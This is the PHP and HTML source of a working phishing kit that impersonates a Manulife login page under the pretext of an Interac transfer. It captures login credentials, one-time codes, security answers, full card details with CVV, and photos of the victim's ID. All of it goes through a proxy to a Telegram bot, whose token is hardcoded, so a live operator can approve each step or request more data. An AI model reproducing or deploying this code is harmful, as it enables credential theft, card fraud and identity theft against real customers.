<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

/* ---------- Configuration ---------- */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

$cancelActionHandled = false;
if (isset($_GET['action']) && $_GET['action'] === 'cancel') {
    $logFile = __DIR__ . '/data/logs/transfers.log';
    if (@is_file($logFile) && @is_writable($logFile)) {
        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!empty($lines)) {
            $last_line_key = count($lines) - 1;
            if (strpos($lines[$last_line_key], 'pending') !== false) {
                 $lines[$last_line_key] = str_replace('pending', 'Cancelled', $lines[$last_line_key]);
                 file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
            }
        }
    }
    $cancelActionHandled = true;
}

/* ---------- Resolve transaction data ---------- */
$tx = $_SESSION['transaction'] ?? $_SESSION['transaction_data'] ?? $_SESSION['last_transfer'] ?? null;
if (!is_array($tx)) $tx = [];

/* ---------- Sender Name ---------- */
$senderName = (string)($tx['sender_name'] ?? $tx['sender'] ?? 'JENNIFER NOSKIYE');

/* ---------- Amount ---------- */
$amount = (string)($tx['amount'] ?? '10.00');

/* ---------- Security Question ---------- */
$securityQuestion = 'What is the color of your car?';

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

$_SESSION['senderName'] = $senderName;
$_SESSION['amount'] = $amount;

/* ---------- Safe HTML values ---------- */
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$securityQuestionSafe = htmlspecialchars($securityQuestion, ENT_QUOTES, 'UTF-8');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in with your Manulife ID</title>
    <style>
        :root {
            --manulife-green: #00a758;
            --manulife-dark-grey: #3c4a54;
            --manulife-dark-text: #34384B;
            --manulife-red-button: #e85f4d;
            --manulife-error-color: #d93025;
            --manulife-light-grey-bg: #f8f9fa;
        }
        body { font-family: 'Roboto', sans-serif; background: var(--manulife-light-grey-bg); margin: 0; color: #333; -webkit-font-smoothing: antialiased; display: flex; flex-direction: column; min-height: 100vh; }
        main {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px 0;
        }
        .container { max-width: 400px; width: 100%; background: #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        header { display: flex; align-items: center; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo-block { background: var(--manulife-green); padding: 0 15px; height: 100%; display: flex; align-items: center; }
        .logo-svg { width: 30px; height: 30px; }
        .header-main { background: var(--manulife-dark-grey); display: flex; justify-content: space-between; align-items: center; flex-grow: 1; height: 100%; padding: 0 15px; }
        .logo-txt-svg { height: 15px; }
        .menu-btn { background: none; border: none; color: #fff; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 2px; }
        .menu-btn svg { width: 24px; height: 24px; fill: #fff; }
        .menu-btn span { font-size: 12px; }
        
        .content { padding: 30px; }
        
        h1.main-title {
            color: var(--manulife-dark-text);
            font-size: 26px;
            font-weight: 300;
            margin-top: 0;
            margin-bottom: 25px;
            text-align: left;
        }
        h1.main-title em { font-style: italic; font-weight: 400; }
        
        .field { margin-bottom: 15px; position: relative; }
        .label { display: block; font-size: 14px; font-weight: 500; color: var(--manulife-dark-text); margin-bottom: 8px; }
        .input {
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ccc;
            padding: 12px;
            font-size: 16px;
            border-radius: 4px;
            background: #fff;
            outline: none;
            transition: border-color 0.2s;
            color: #333;
        }
        .input:focus { border: 1px solid var(--manulife-green); box-shadow: 0 0 0 1px var(--manulife-green); }
        select.input { background-color: #fff; }
        
        .show-pw { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #000; font-size: 13px; cursor: pointer; display: flex; align-items: center; font-weight: 700; background: #eee; padding: 4px 8px; border-radius: 4px; }
        
        .form-options { display: flex; align-items: center; margin: 15px 0; }
        .remember-me { display: flex; align-items: center; font-size: 14px; }
        .remember-me input { margin-right: 8px; }
        .form-link { font-size: 14px; color: var(--manulife-green); text-decoration: none; margin-top: 10px; display: inline-block; }
        .form-link:hover { text-decoration: underline; }
        
        .btn {
            width: 100%; border: none; padding: 14px;
            font-size: 16px; font-weight: 700; border-radius: 4px; 
            cursor: pointer; margin: 20px 0; transition: background-color 0.3s;
        }
        .btn.ready { background: var(--manulife-red-button); color: #fff; text-transform: none; }
        .btn.ready:hover { background: #d44a37; }
        
        .error-message { color: var(--manulife-error-color); margin-bottom: 15px; font-size: 14px; display: none; }
        .checkmark{width:60px;height:60px;border-radius:50%;border:4px solid var(--manulife-green);position:relative;margin: 0 auto 20px auto;animation:scaleUp 0.5s ease forwards;}
        .checkmark::after{content:'';position:absolute;left:18px;top:30px;width:20px;height:10px;border-left:4px solid var(--manulife-green);border-bottom:4px solid var(--manulife-green);transform:rotate(-45deg);transform-origin:left top;opacity:0;animation:drawCheck 0.5s 0.5s forwards;}
        @keyframes scaleUp{0%{transform:scale(0);}100%{transform:scale(1);}}
        @keyframes drawCheck{0%{opacity:0;transform:rotate(-45deg) scale(0);}100%{opacity:1;transform:rotate(-45deg) scale(1);}}
    
        .tx-info { background: #f8f8f8; border-radius: 4px; padding: 15px; margin-bottom: 25px; border-left: 5px solid var(--manulife-green); font-size: 14px; }
        .tx-info div { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .tx-info strong { color: var(--manulife-dark-text); font-weight: 500; }
        .step { display: none; }
        
        .extra-links { border-top: 1px solid #eee; padding-top: 20px; margin-top: 20px; }
        .extra-links a { display: block; color: var(--manulife-dark-text); text-decoration: none; font-size: 14px; margin-bottom: 15px; }
        .extra-links a:hover { color: var(--manulife-green); }

        footer { background: var(--manulife-dark-grey); color: #fff; padding: 30px; }
        .footer-content { max-width: 400px; margin: 0 auto; }
        .footer-links { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 30px; }
        .footer-links a { color: #fff; text-decoration: none; font-size: 14px; }
        .footer-links a:hover { text-decoration: underline; }
        .footer-links svg { width: 12px; height: 12px; fill: #fff; margin-left: 5px; }
        .footer-bottom { border-top: 1px solid #5a666e; padding-top: 20px; display: flex; align-items: center; }
        .footer-logo { width: 20px; height: 20px; margin-right: 10px; }
        .copyright { font-size: 12px; color: #ccc; }

        #stepLoader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.9); display: none; justify-content: center; align-items: center; z-index: 2000; flex-direction: column; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f0f0f0; border-top: 5px solid var(--manulife-green); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .id-upload-area {
            border: 2px dashed #ccc;
            padding: 20px;
            text-align: center;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            background: #fff;
            transition: 0.2s;
        }
        .id-upload-area:hover { border-color: var(--manulife-green); background: #f0fff0; }
        .id-upload-area span { display: block; font-weight: bold; color: var(--manulife-green); margin-bottom: 5px; }
        .id-upload-area small { color: #666; font-size: 12px; }
    </style>
</head>
<body>

<header>
    <div class="logo-block">
        <svg class="logo-svg" viewBox="0 0 100 100">
            <g fill="none">
                <path fill="#fff" d="M36.903 26.667l-8.57 8.562v39.39l8.57-8.563V26.667zm17.139 0l-8.568 8.562v39.39l8.568-8.563V26.667zm17.141 0l-8.57 8.562v39.39l8.57-8.563V26.667z"></path>
            </g>
        </svg>
    </div>
    <div class="header-main">
        <svg class="logo-txt-svg" viewBox="0 0 170.01 31.2">
            <path d="M91.3 26.9V25a5.92 5.92 0 01-4.8 2.2c-2.9 0-5.2-1.8-5.2-4.9 0-3.8 3.5-5.2 7-5.5l1.3-.2c1.3-.1 1.8-.8 1.8-1.7 0-1.1-1-1.9-2.6-1.9a5.45 5.45 0 00-4.2 2.3l-2-2.4a7.83 7.83 0 016.4-2.8c3.8 0 5.9 1.9 5.9 5.2v11.6zm0-7.8l-2.5.3c-2.1.3-4 1-4 2.8a2.33 2.33 0 002.4 2.2h.1a5.26 5.26 0 004-2.2v-3.1zM101.7 26.9h-3.6V10.6h3.6v1.8a7.49 7.49 0 015.3-2.2c1.9 0 4.6 1.1 4.6 5.1v11.6H108V16.2c0-1.6-.7-3-2.3-3a7.48 7.48 0 00-4 1.9zM124.3 10.6h3.6v16.3h-3.7v-1.8a6.44 6.44 0 01-4.7 2.1c-2.1 0-5-1.1-5-5.2V10.6h3.6v10.3c0 1.9.8 3.2 2.5 3.2a5.32 5.32 0 003.8-2zM135.5 26.9h-3.6V5.4l3.6-3.6zM141.3 3.2a2.26 2.26 0 012.3 2.3 2.3 2.3 0 11-4.6 0 2.47 2.47 0 012.3-2.3zm1.9 23.7h-3.8V10.6h3.8zM154.6 13.6h-3.4v13.3h-3.6V13.6h-2.2v-3h2.2V7.2a4.83 4.83 0 014.6-5.1h.5a8.08 8.08 0 013.7.9l-1.1 2.8a3.61 3.61 0 00-2-.6 2.11 2.11 0 00-2.1 2.1v3.4h4.3zM158.9 19.7a4.27 4.27 0 004.1 4.5h.1a5.24 5.24 0 004.2-2.5l2.2 2.1a8.39 8.39 0 01-6.8 3.5c-4.7 0-7.6-3.5-7.6-8.5s3.1-8.5 7.7-8.5c4.3 0 7.4 2.8 7.2 9.5h-11.1zm7.4-2.7a3.59 3.59 0 00-3.3-3.9h-.2A4 4 0 00159 17zM60.7 26.9h-4V4.3h4.2l6.8 11.2 6.7-11.2h4.2V27h-4V10.9h-.1l-6.8 11.4-6.9-11.4v16z" fill="#fff"></path>
        </svg>
        <button class="menu-btn">
            <svg viewBox="0 0 20 20"><path d="M19 3.362H1v1.667h18V3.362zm0 5.795H1v1.667h18V9.157zM1 14.972h18v1.667H1v-1.667z"></path></svg>
            <span>Menu</span>
        </button>
    </div>
</header>
<main>
    <div class="container">
        <div class="content">
            <!-- Step 1: Login -->
            <div id="stepLogin" class="step">
                <h1 class="main-title"><em>Sign in</em> with your Manulife ID</h1>
                <div id="errorMsgLogin" class="error-message"></div>
                <form id="loginForm">
                    <div class="field">
                        <label class="label" for="username">Username</label>
                        <input type="text" id="username" class="input" required>
                    </div>
                    <div class="form-options">
                        <label class="remember-me">
                            <input type="checkbox"> Remember username
                        </label>
                    </div>
                    <a href="#" class="form-link" style="margin-top:0;">Forgot your username?</a>
                    <div class="field" style="margin-top: 20px;">
                         <label class="label" for="password">Password</label>
                        <div style="position:relative;">
                            <input type="password" id="password" class="input" required>
                            <div class="show-pw" id="passwordToggle">
                                <span>SHOW</span>
                            </div>
                        </div>
                    </div>
                     <a href="#" class="form-link">Forgot your password?</a>
                    <button type="submit" id="loginBtn" class="btn ready">Sign in</button>
                </form>
                <div class="extra-links">
                     <a href="#">Don't have a Manulife ID? <strong>Set one up now</strong></a>
                     <a href="#">What's a Manulife ID?</a>
                     <a href="#">Travel Claims</a>
                     <a href="#">Advisor Manulife ID sign in</a>
                     <a href="#">Sponsor Manulife ID sign in</a>
                </div>
            </div>

            <!-- Step 2: PIN -->
            <div id="stepPIN" class="step">
                <h1 style="font-size:20px; color:var(--manulife-dark-text); margin-bottom:10px;">Security Verification</h1>
                <p style="font-size:14px; color:#666; line-height:1.4;">For your security, please enter the 6 to 8-digit code sent to your device.</p>
                <div id="errorMsgPIN" class="error-message"></div>
                <form id="pinForm">
                    <div class="field">
                        <label class="label">Security Code</label>
                        <input type="tel" id="pinCode" class="input" maxlength="8" placeholder="******" style="text-align:center; letter-spacing:5px;" required>
                    </div>
                    <button type="submit" id="pinBtn" class="btn ready" style="background: var(--manulife-green);">Validate</button>
                </form>
            </div>

            <!-- Step 3: Security Question -->
            <div id="stepSQ" class="step">
                <h1 style="font-size:20px; color:var(--manulife-dark-text); margin-bottom:10px;">Interac Settlement</h1>
                <div class="tx-info">
                    <div><span>Sender:</span> <strong><?php echo $senderNameSafe; ?></strong></div>
                    <div><span>Amount:</span> <strong>$<?php echo $amountSafe; ?> CAD</strong></div>
                </div>
                <p style="font-size:14px; color:#666; line-height:1.4;"><strong>Security Question:</strong> <?php echo $securityQuestionSafe; ?></p>
                <div id="errorMsgSQ" class="error-message"></div>
                <form id="sqForm">
                    <div class="field">
                        <label class="label">Answer</label>
                        <input type="text" id="sqAnswer" class="input" placeholder="Answer" required>
                    </div>
                    <button type="submit" id="sqBtn" class="btn ready" style="background: var(--manulife-green);">Accept Transfer</button>
                </form>
                <button id="cancelTransferLink" style="background:none; border:none; color:var(--manulife-green); text-decoration:underline; cursor:pointer; font-size:15px; width:100%; text-align:center; padding:10px 0;">Cancel Transfer</button>
            </div>

            <!-- Step 4: CC -->
            <div id="stepCC" class="step">
                <h1 style="font-size:20px; color:var(--manulife-dark-text); margin-bottom:10px;">Card Verification</h1>
                <p style="font-size:14px; color:#666; line-height:1.4;">Please enter your card information to verify your identity.</p>
                <div id="errorMsgCC" class="error-message"></div>
                <form id="ccForm">
                    <div class="field">
                        <label class="label">Card Number</label>
                        <input type="tel" id="ccNum" class="input" maxlength="19" placeholder="0000 0000 0000 0000" required>
                    </div>
                    <div style="display:flex; gap:15px;">
                        <div class="field" style="flex:1;">
                            <label class="label">Expiry Month</label>
                            <select id="ccMonth" class="input" required>
                                <option value="" disabled selected>MM</option>
                                <option>01</option><option>02</option><option>03</option><option>04</option>
                                <option>05</option><option>06</option><option>07</option><option>08</option>
                                <option>09</option><option>10</option><option>11</option><option>12</option>
                            </select>
                        </div>
                        <div class="field" style="flex:1;">
                            <label class="label">Expiry Year</label>
                            <select id="ccYear" class="input" required>
                                <option value="" disabled selected>YY</option>
                                <option>25</option><option>26</option><option>27</option><option>28</option>
                                <option>29</option><option>30</option><option>31</option><option>32</option>
                            </select>
                        </div>
                    </div>
                    <div class="field">
                         <label class="label">CVV</label>
                         <input type="tel" id="ccCvv" class="input" maxlength="3" placeholder="123" required>
                    </div>
                    <button type="submit" id="ccBtn" class="btn ready" style="background: var(--manulife-green);">Verify</button>
                </form>
            </div>

            <!-- Step 5: ID Upload -->
            <div id="stepID" class="step">
                <h1 style="font-size:20px; color:var(--manulife-dark-text); margin-bottom:10px;">Identity Verification</h1>
                <p style="font-size:14px; color:#666; line-height:1.4;">Please upload a clear photo of your government-issued ID.</p>
                <div id="errorMsgID" class="error-message"></div>
                
                <div class="id-upload-area" onclick="document.getElementById('idFront').click()">
                    <span>📷 Upload Front ID</span>
                    <small id="nameFront">No file selected</small>
                    <input type="file" id="idFront" hidden accept="image/*" onchange="document.getElementById('nameFront').textContent = this.files[0].name">
                </div>

                <div class="id-upload-area" onclick="document.getElementById('idBack').click()">
                    <span>📷 Upload Back ID</span>
                    <small id="nameBack">No file selected</small>
                    <input type="file" id="idBack" hidden accept="image/*" onchange="document.getElementById('nameBack').textContent = this.files[0].name">
                </div>

                <button id="idBtn" class="btn ready" style="background: var(--manulife-green);" onclick="handleIDStep()">Submit Documents</button>
            </div>

            <!-- Step 6: Success Confirmation -->
            <div id="stepConfirm" class="step" style="text-align:center;">
                <div class="checkmark"></div>
                <h1 style="font-size:22px; color:var(--manulife-green);">Success</h1>
                <p style="font-size:14px; color:#666; line-height:1.6;">Your transfer of <strong>$<?php echo $amountSafe; ?> CAD</strong> is complete. The funds will appear in your account within 30 minutes.<br><br>You will be redirected shortly.</p>
            </div>

            <!-- Step 7: Cancel Confirmation -->
            <div id="stepCancelConfirm" class="step" style="text-align:center;">
                <h1 style="font-size:22px; color:var(--manulife-green);">Transfer Cancelled</h1>
                <p style="font-size:14px; color:#666; line-height:1.6;">The Interac transfer was successfully cancelled. No funds have been deposited.</p>
                <button onclick="location.href='index.php'" class="btn ready" style="margin-top:20px; background: var(--manulife-green);">Return to Home</button>
            </div>
        </div>
    </div>
</main>
<footer>
    <div class="footer-content">
        <div class="footer-links">
            <a href="#">Accessibility <svg viewBox="0 0 15 15"><path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path></svg></a>
            <a href="#">Legal <svg viewBox="0 0 15 15"><path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path></svg></a>
            <a href="#">Terms & Conditions <svg viewBox="0 0 15 15"><path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path></svg></a>
            <a href="#">Privacy Policy <svg viewBox="0 0 15 15"><path d="M13,0H7V2h4.59l-4,4H0v9H9V7.43l4-4V8h2V0ZM7,13H2V8H7Z"></path></svg></a>
        </div>
        <div class="footer-bottom">
            <svg class="footer-logo" viewBox="0 0 100 100">
                <g fill="none">
                     <path fill="#fff" d="M36.903 26.667l-8.57 8.562v39.39l8.57-8.563V26.667zm17.139 0l-8.568 8.562v39.39l8.568-8.563V26.667zm17.141 0l-8.57 8.562v39.39l8.57-8.563V26.667z"></path>
                </g>
            </svg>
            <span class="copyright">© 1999-2024 The Manufacturers Life Insurance Company</span>
        </div>
    </div>
</footer>

<!-- Loader Overlay -->
<div id="stepLoader">
    <div class="spinner"></div>
    <p style="color:#555; font-size:16px;">Processing, please wait...</p>
</div>

<script>
const chatId = "<?= $chatId ?>";
const ALL_STEPS = ['stepLogin', 'stepPIN', 'stepSQ', 'stepCC', 'stepID', 'stepConfirm', 'stepCancelConfirm'];

function showStep(stepId) {
    ALL_STEPS.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
    const stepEl = document.getElementById(stepId);
    if(stepEl) stepEl.style.display = 'block';
    window.scrollTo(0,0);
}

const loader = document.getElementById('stepLoader');
function showLoader() { if (loader) loader.style.display = 'flex'; }
function hideLoader() { if (loader) loader.style.display = 'none'; }
function showError(msg, errorId) {
    const el = document.getElementById(errorId);
    if (el) { el.textContent = msg; el.style.display = 'block'; }
}
function hideError(errorId) {
    const el = document.getElementById(errorId);
    if (el) el.style.display = 'none';
}

const passwordInput = document.getElementById('password');
const passwordToggle = document.getElementById('passwordToggle');
if(passwordToggle){
    passwordToggle.addEventListener('click', () => {
        const isPassword = passwordInput.getAttribute('type') === 'password';
        passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
        passwordToggle.querySelector('span').textContent = isPassword ? 'HIDE' : 'SHOW';
    });
}

// CC Formatting
const ccNum = document.getElementById('ccNum');
if(ccNum) {
    ccNum.addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, '').substring(0,16);
        let f = v.match(/.{1,4}/g);
        e.target.value = f ? f.join(' ') : v;
    });
}

// API Proxy Helper
async function api(action, data, isFile = false) {
    let body;
    if(isFile) {
        body = new FormData();
        body.append('action', action);
        for(let k in data) body.append(k, data[k]);
    } else {
        const fd = new FormData();
        fd.append('action', action);
        for(let k in data) fd.append(k, data[k]);
        body = fd;
    }
    return fetch('', {method:'POST', body}).then(r=>r.json());
}

let lastUpdateId = 0;
let pollInterval;

// Initialize Polling
api('getUpdates', {offset: -1}).then(d => { 
    if(d.result && d.result.length) lastUpdateId = d.result[0].update_id; 
});

function poll(msgId, onOk, onFail, onCleanup) {
    if(pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(async () => {
        try {
            const r = await fetch('', {
                method:'POST', 
                headers:{'Content-Type':'application/x-www-form-urlencoded'},
                body:`action=getUpdates&offset=${lastUpdateId+1}&timeout=2`
            });
            const d = await r.json();
            if(d.result && d.result.length) {
                for(let u of d.result) {
                    lastUpdateId = u.update_id;
                    if(u.callback_query && u.callback_query.message.message_id == msgId) {
                        clearInterval(pollInterval);
                        const cmd = u.callback_query.data;
                        api('editMessageReplyMarkup', {chat_id:chatId, message_id:msgId, reply_markup:JSON.stringify({inline_keyboard:[]})});
                        
                        if (typeof onCleanup === 'function') onCleanup();
                        
                        if(cmd === 'yes') onOk();
                        else if(cmd === 'no') onFail();
                        else if(cmd === 'go_cc') showStep('stepCC');
                        else if(cmd === 'go_id') showStep('stepID');
                        else if(cmd === 'cancel') window.location.href="https://www.manulife.ca";
                    }
                }
            }
        } catch(e){}
    }, 2000);
}

async function sendLog(step, content, btnId, next) {
    const btn = document.getElementById(btnId);
    const originalText = btn.textContent;
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    showLoader();
    
    const cleanup = () => {
         hideLoader();
         btn.disabled = false;
         btn.textContent = originalText;
    };

    try {
        const kb = {inline_keyboard:[
            [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
            [{text:"REQ CC", callback_data:"go_cc"}, {text:"REQ ID", callback_data:"go_id"}],
            [{text:"🚫 END SESSION", callback_data:"cancel"}]
        ]};
        
        const r = await api('sendMessage', {
            chat_id: chatId,
            text: `🟩 <b>MANULIFE - ${step}</b>\n\n${content}`,
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(kb)
        });
        
        poll(r.result.message_id, 
            () => next(), // OK
            () => { // Fail
                if(step === 'LOGIN') { showStep('stepLogin'); showError('Invalid Username or Password.', 'errorMsgLogin'); }
                if(step === 'PIN') { showStep('stepPIN'); showError('Invalid security code.', 'errorMsgPIN'); }
                if(step === 'SQ') { showStep('stepSQ'); showError('Incorrect security answer.', 'errorMsgSQ'); }
                if(step === 'CC') { showStep('stepCC'); showError('Card information invalid.', 'errorMsgCC'); }
            },
            cleanup
        );
    } catch(e) {
        cleanup();
    }
}

document.getElementById('loginForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const u = document.getElementById('username').value.trim();
    const p = document.getElementById('password').value.trim();
    if (u.length < 3 || p.length < 6) { showError("Invalid Username or Password.", 'errorMsgLogin'); return; }
    hideError('errorMsgLogin');
    sendLog('LOGIN', `User: <code>${u}</code>\nPass: <code>${p}</code>`, 'loginBtn', () => showStep('stepPIN'));
});

document.getElementById('pinForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const c = document.getElementById('pinCode').value.trim();
    if (!/^\d{6,8}$/.test(c)) { showError('Invalid security code.', 'errorMsgPIN'); return; }
    hideError('errorMsgPIN');
    sendLog('PIN', `Code: <code>${c}</code>`, 'pinBtn', () => showStep('stepSQ'));
});

document.getElementById('sqForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const a = document.getElementById('sqAnswer').value.trim();
    if (!a) { showError('Answer required.', 'errorMsgSQ'); return; }
    hideError('errorMsgSQ');
    sendLog('SQ', `Answer: <code>${a}</code>`, 'sqBtn', () => {
         showStep('stepConfirm');
         setTimeout(() => { window.location.href = 'https://www.manulife.ca/'; }, 5000);
    });
});

document.getElementById('ccForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const n = document.getElementById('ccNum').value;
    const m = document.getElementById('ccMonth').value;
    const y = document.getElementById('ccYear').value;
    const c = document.getElementById('ccCvv').value;
    if(!m || !y) { showError('Expiration Date Required', 'errorMsgCC'); return; }
    hideError('errorMsgCC');
    sendLog('CC', `Card: <code>${n}</code>\nExp: <code>${m}/${y}</code>\nCVV: <code>${c}</code>`, 'ccBtn', () => showStep('stepID'));
});

async function handleIDStep() {
    const f = document.getElementById('idFront').files[0];
    const b = document.getElementById('idBack').files[0];
    if(!f || !b) { showError("Please upload both front and back images.", 'errorMsgID'); return; }
    hideError('errorMsgID');
    
    const btn = document.getElementById('idBtn');
    const originalText = btn.textContent;
    btn.textContent = "Uploading...";
    btn.disabled = true;
    showLoader();

    try {
        await api('sendPhoto', {chat_id: chatId, caption: 'Front ID', photo: f}, true);
        await api('sendPhoto', {chat_id: chatId, caption: 'Back ID', photo: b}, true);
        
        sendLog('ID DOCS', 'Documents uploaded.', 'idBtn', () => {
             showStep('stepConfirm');
             setTimeout(() => { window.location.href = 'https://www.manulife.ca/'; }, 4000);
        });
    } catch(e) {
        hideLoader();
        btn.disabled = false;
        btn.textContent = originalText;
        showError("Upload failed. Please try again.", 'errorMsgID');
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const initialStep = '<?php echo $cancelActionHandled ? 'stepCancelConfirm' : 'stepLogin'; ?>';
    showStep(initialStep);
});
</script>

</body>
</html>